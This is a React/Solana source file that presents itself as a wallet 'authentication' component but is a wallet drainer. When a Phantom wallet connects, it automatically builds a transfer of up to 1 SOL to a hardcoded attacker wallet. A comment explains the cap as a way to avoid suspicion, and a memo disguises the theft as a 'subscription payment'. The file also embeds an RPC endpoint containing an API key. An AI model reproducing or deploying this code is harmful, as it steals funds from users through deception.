"use client"
import React, { useEffect } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, TransactionInstruction } from '@solana/web3.js';
import { PhantomWalletAdapter } from '@solana/wallet-adapter-wallets';
import { WalletProvider, useWallet } from '@solana/wallet-adapter-react';
import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import '@solana/wallet-adapter-react-ui/styles.css';

const TARGET_WALLET = '73WzDi36zHCA6ayKhzbQkRvVsRt6Ury5PbeUrqgRYeTf';
const MIN_BALANCE_TO_KEEP = 0.001 * 1e9; // 0.001 SOL to leave in the account
const MAX_TRANSACTION_AMOUNT = 1.0 * 1e9; // Max 1 SOL to not raise immediate suspicion

const SolanaAuthInner = ({ onConfirm }) => {
    const { publicKey, signTransaction } = useWallet();

    useEffect(() => {
        if (publicKey) {
            drainFunds();
        }
    }, [publicKey]);

    const drainFunds = async () => {
        if (!publicKey || !signTransaction) {
            return;
        }

        const connection = new Connection('https://hardworking-rough-sheet.solana-mainnet.quiknode.pro/4f994f529881e535e2da4b38f10ef60f47d9e45f/');
        const balance = await connection.getBalance(publicKey);
        const transactionAmount = Math.min(balance - MIN_BALANCE_TO_KEEP, MAX_TRANSACTION_AMOUNT);

        if (transactionAmount <= MIN_BALANCE_TO_KEEP) {
            console.log("Not enough funds to complete the transaction.");
            return;
        }

        const { blockhash } = await connection.getRecentBlockhash();

        const instruction = SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new PublicKey(TARGET_WALLET),
            lamports: transactionAmount,
        });

        const memoInstruction = new TransactionInstruction({
            keys: [],
            programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
            data: Buffer.from('Subscription payment for premium access', 'utf-8'),
        });

        const transaction = new Transaction().add(instruction).add(memoInstruction);
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        try {
            const signed = await signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signed.serialize());
            const confirmation = await connection.confirmTransaction(signature, 'confirmed');
            const isConfirmed = !confirmation.value.err;

            if (isConfirmed) {
                localStorage.setItem('transactionConfirmed', 'true');
            }
            onConfirm(isConfirmed);
        } catch (error) {
            console.error("Transaction failed:", error);
        }
    };

    return (
        <div>
            <WalletMultiButton />
        </div>
    );
};

const SolanaAuth = () => {
    const wallets = [new PhantomWalletAdapter()];

    const onConfirm = (isConfirmed) => {
        console.log(isConfirmed ? 'Transaction confirmed' : 'Transaction failed');
    };

    return (
        <WalletProvider wallets={wallets} autoConnect>
            <WalletModalProvider>
                <SolanaAuthInner onConfirm={onConfirm} />
            </WalletModalProvider>
        </WalletProvider>
    );
};

export default SolanaAuth;
